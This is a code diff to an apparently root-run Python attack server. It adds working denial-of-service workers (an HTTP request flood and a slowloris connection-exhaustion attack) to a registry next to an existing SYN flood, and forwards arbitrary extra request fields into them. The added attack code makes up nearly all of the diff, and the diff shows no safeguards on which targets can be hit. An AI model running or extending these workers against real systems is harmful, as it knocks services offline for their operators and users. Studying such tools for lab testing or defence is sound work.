@@ -12,6 +12,7 @@ import random
 import subprocess
 import threading
 import time
+import socket
 
 if os.geteuid() != 0:
     print("ERROR: This server must be run as root (use Docker with NET_ADMIN/NET_RAW caps)")
@@ -395,7 +396,7 @@ def http_request_proxy():
 
 # ── DoS attack workers ─────────────────────────────────────────────────────────
 
-def _syn_flood_worker(target_ip, target_port, pps, duration, stop_event, stats):
+def _syn_flood_worker(target_ip, target_port, pps, duration, stop_event, stats, **kwargs):
     interval = 1.0 / pps if pps > 0 else 0
     deadline = time.time() + duration if duration > 0 else float('inf')
     while not stop_event.is_set() and time.time() < deadline:
@@ -412,8 +413,71 @@ def _syn_flood_worker(target_ip, target_port, pps, duration, stop_event, stats):
     stop_event.set()
 
 
+def _http_flood_worker(target_ip, target_port, pps, duration, stop_event, stats,
+                       method='GET', path='/', **kwargs):
+    interval = 1.0 / pps if pps > 0 else 0
+    deadline = time.time() + duration if duration > 0 else float('inf')
+    url = f"http://{target_ip}:{target_port}{path}"
+    while not stop_event.is_set() and time.time() < deadline:
+        try:
+            req_lib.request(method, url, timeout=3, verify=False, allow_redirects=False)
+        except Exception:
+            pass
+        stats['sent'] += 1
+        if interval:
+            time.sleep(interval)
+    stop_event.set()
+
+
+def _slowloris_worker(target_ip, target_port, pps, duration, stop_event, stats,
+                      connections=150, sleep_interval=10, **kwargs):
+    deadline = time.time() + duration if duration > 0 else float('inf')
+    sockets = []
+
+    def _open_socket():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target_ip, int(target_port)))
+        s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
+        return s
+
+    for _ in range(int(connections)):
+        if stop_event.is_set():
+            break
+        try:
+            sockets.append(_open_socket())
+            stats['sent'] += 1
+        except Exception:
+            pass
+
+    while not stop_event.is_set() and time.time() < deadline:
+        dead = []
+        for s in sockets:
+            try:
+                s.send(b"X-Keep: alive\r\n")
+            except Exception:
+                dead.append(s)
+        for s in dead:
+            sockets.remove(s)
+            try: s.close()
+            except Exception: pass
+            try:
+                sockets.append(_open_socket())
+                stats['sent'] += 1
+            except Exception:
+                pass
+        time.sleep(float(sleep_interval))
+
+    for s in sockets:
+        try: s.close()
+        except Exception: pass
+    stop_event.set()
+
+
 _ATTACK_WORKERS = {
-    'syn_flood': _syn_flood_worker,
+    'syn_flood':  _syn_flood_worker,
+    'http_flood': _http_flood_worker,
+    'slowloris':  _slowloris_worker,
 }
 
 
@@ -436,10 +500,13 @@ def dos_start():
     job_id     = str(uuid.uuid4())
     stop_event = threading.Event()
     stats      = {"sent": 0, "start_time": time.time()}
+    extra      = {k: v for k, v in data.items()
+                  if k not in {'attack_type', 'target_ip', 'target_port', 'pps', 'duration'}}
 
     t = threading.Thread(
         target=_ATTACK_WORKERS[attack_type],
         args=(target_ip, target_port, pps, duration, stop_event, stats),
+        kwargs=extra,
         daemon=True,
     )
     dos_jobs[job_id] = {"thread": t, "stop_event": stop_event, "stats": stats}
